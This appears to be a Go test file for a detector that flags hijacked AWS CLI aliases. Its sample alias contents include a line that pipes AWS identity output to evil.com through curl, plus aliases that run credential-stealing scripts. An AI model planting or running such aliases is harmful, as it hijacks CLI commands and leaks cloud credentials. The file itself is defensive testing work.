package signals

import (
	"context"
	"os"
	"path/filepath"
	"testing"
)

func TestAWSAliasHijackSignal_NoFile(t *testing.T) {
	signal := NewAWSAliasHijackSignal()
	ctx := context.Background()

	// Should return false when no alias file exists
	result := signal.Check(ctx)
	if result {
		t.Error("Expected false when no alias file exists")
	}
}

func TestAWSAliasHijackSignal_InsecurePermissions(t *testing.T) {
	// Create temporary directory structure
	tmpDir := t.TempDir()
	awsDir := filepath.Join(tmpDir, ".aws", "cli")
	err := os.MkdirAll(awsDir, 0755)
	if err != nil {
		t.Fatalf("Failed to create test directory: %v", err)
	}

	aliasPath := filepath.Join(awsDir, "alias")

	// Create alias file with insecure permissions (0644)
	err = os.WriteFile(aliasPath, []byte("# Safe alias\ntest = s3 ls\n"), 0644)
	if err != nil {
		t.Fatalf("Failed to create test file: %v", err)
	}

	// Temporarily override home directory
	originalHome := os.Getenv("HOME")
	os.Setenv("HOME", tmpDir)
	defer os.Setenv("HOME", originalHome)

	signal := NewAWSAliasHijackSignal()
	ctx := context.Background()

	result := signal.Check(ctx)
	if !result {
		t.Error("Expected true for insecure file permissions (0644)")
	}
}

func TestAWSAliasHijackSignal_CoreCommandHijack(t *testing.T) {
	testCases := []struct {
		name         string
		aliasContent string
		shouldDetect bool
		description  string
	}{
		{
			name:         "Safe alias",
			aliasContent: "# Safe aliases\nmylist = s3 ls\ndev = s3 sync --profile dev\n",
			shouldDetect: false,
			description:  "Custom aliases that don't override core commands",
		},
		{
			name:         "Hijack sts",
			aliasContent: "sts = !curl http://evil.com/steal?token=$(aws sts get-caller-identity)\n",
			shouldDetect: true,
			description:  "Alias overriding core 'sts' command",
		},
		{
			name:         "Hijack s3",
			aliasContent: "s3 = !echo 'pwned' && aws s3\n",
			shouldDetect: true,
			description:  "Alias overriding core 's3' command",
		},
		{
			name:         "Hijack iam",
			aliasContent: "iam = !malicious-script.sh\n",
			shouldDetect: true,
			description:  "Alias overriding core 'iam' command",
		},
		{
			name:         "Hijack configure",
			aliasContent: "configure = !steal-credentials.py\n",
			shouldDetect: true,
			description:  "Alias overriding core 'configure' command",
		},
		{
			name:         "Multiple with one hijack",
			aliasContent: "# Mixed aliases\nmylist = s3 ls\nsts = !evil-command\ndev = s3 sync\n",
			shouldDetect: true,
			description:  "Multiple aliases with one malicious override",
		},
		{
			name:         "Comments and empty lines",
			aliasContent: "# Comment\n\n  \n# Another comment\nmyalias = s3 ls\n",
			shouldDetect: false,
			description:  "File with comments and empty lines, no hijacks",
		},
		{
			name:         "Whitespace handling",
			aliasContent: "  sts  =  !evil-command  \n",
			shouldDetect: true,
			description:  "Alias with extra whitespace",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Create temporary directory structure
			tmpDir := t.TempDir()
			awsDir := filepath.Join(tmpDir, ".aws", "cli")
			err := os.MkdirAll(awsDir, 0755)
			if err != nil {
				t.Fatalf("Failed to create test directory: %v", err)
			}

			aliasPath := filepath.Join(awsDir, "alias")

			// Create alias file with secure permissions (0600)
			err = os.WriteFile(aliasPath, []byte(tc.aliasContent), 0600)
			if err != nil {
				t.Fatalf("Failed to create test file: %v", err)
			}

			// Temporarily override home directory
			originalHome := os.Getenv("HOME")
			os.Setenv("HOME", tmpDir)
			defer os.Setenv("HOME", originalHome)

			signal := NewAWSAliasHijackSignal()
			ctx := context.Background()

			result := signal.Check(ctx)
			if result != tc.shouldDetect {
				t.Errorf("%s: Expected %v, got %v", tc.description, tc.shouldDetect, result)
			}
		})
	}
}

func TestAWSAliasHijackSignal_AllCoreCommands(t *testing.T) {
	coreCommands := []string{
		"cloudformation", "cloudtrail", "cloudwatch", "configure",
		"dynamodb", "ec2", "ecr", "eks", "iam", "kms",
		"lambda", "login", "logs", "rds", "s3",
		"secretsmanager", "ssm", "sso", "sts",
	}

	for _, cmd := range coreCommands {
		t.Run("Hijack_"+cmd, func(t *testing.T) {
			tmpDir := t.TempDir()
			awsDir := filepath.Join(tmpDir, ".aws", "cli")
			err := os.MkdirAll(awsDir, 0755)
			if err != nil {
				t.Fatalf("Failed to create test directory: %v", err)
			}

			aliasPath := filepath.Join(awsDir, "alias")
			aliasContent := cmd + " = !malicious-command\n"

			err = os.WriteFile(aliasPath, []byte(aliasContent), 0600)
			if err != nil {
				t.Fatalf("Failed to create test file: %v", err)
			}

			originalHome := os.Getenv("HOME")
			os.Setenv("HOME", tmpDir)
			defer os.Setenv("HOME", originalHome)

			signal := NewAWSAliasHijackSignal()
			ctx := context.Background()

			result := signal.Check(ctx)
			if !result {
				t.Errorf("Expected detection for hijacked command: %s", cmd)
			}
		})
	}
}

func TestAWSAliasHijackSignal_DirectoryTraversalPrevention(t *testing.T) {
	// Test that the signal rejects home directories with ".." (directory traversal)
	oldHome := os.Getenv("HOME")
	defer os.Setenv("HOME", oldHome)

	// Try to set a malicious HOME path with directory traversal
	maliciousPath := "/tmp/../etc"
	os.Setenv("HOME", maliciousPath)

	signal := NewAWSAliasHijackSignal()
	ctx := context.Background()

	// The check should return false (reject the malicious path)
	result := signal.Check(ctx)
	if result {
		t.Error("Expected false when home directory contains '..' (directory traversal attempt)")
	}
}

func TestAWSAliasHijackSignal_RelativePathPrevention(t *testing.T) {
	// Test that the signal rejects relative home directories
	oldHome := os.Getenv("HOME")
	defer os.Setenv("HOME", oldHome)

	// Try to set a relative HOME path
	relativePath := "relative/path"
	os.Setenv("HOME", relativePath)

	signal := NewAWSAliasHijackSignal()
	ctx := context.Background()

	// The check should return false (reject relative paths)
	result := signal.Check(ctx)
	if result {
		t.Error("Expected false when home directory is relative (not absolute)")
	}
}

func TestAWSAliasHijackSignal_ValidAbsolutePath(t *testing.T) {
	// Test that valid absolute paths work correctly
	tmpDir := t.TempDir()
	oldHome := os.Getenv("HOME")
	os.Setenv("HOME", tmpDir)
	defer os.Setenv("HOME", oldHome)

	// Create .aws/cli directory with hijacked alias
	awsDir := filepath.Join(tmpDir, ".aws", "cli")
	err := os.MkdirAll(awsDir, 0755)
	if err != nil {
		t.Fatalf("Failed to create test directory: %v", err)
	}

	aliasPath := filepath.Join(awsDir, "alias")
	aliasContent := "sts = !evil-command\n"
	err = os.WriteFile(aliasPath, []byte(aliasContent), 0600)
	if err != nil {
		t.Fatalf("Failed to create test file: %v", err)
	}

	signal := NewAWSAliasHijackSignal()
	ctx := context.Background()

	// Should work with valid absolute path and detect the hijack
	result := signal.Check(ctx)
	if !result {
		t.Error("Expected true with valid absolute path and hijacked alias")
	}
}
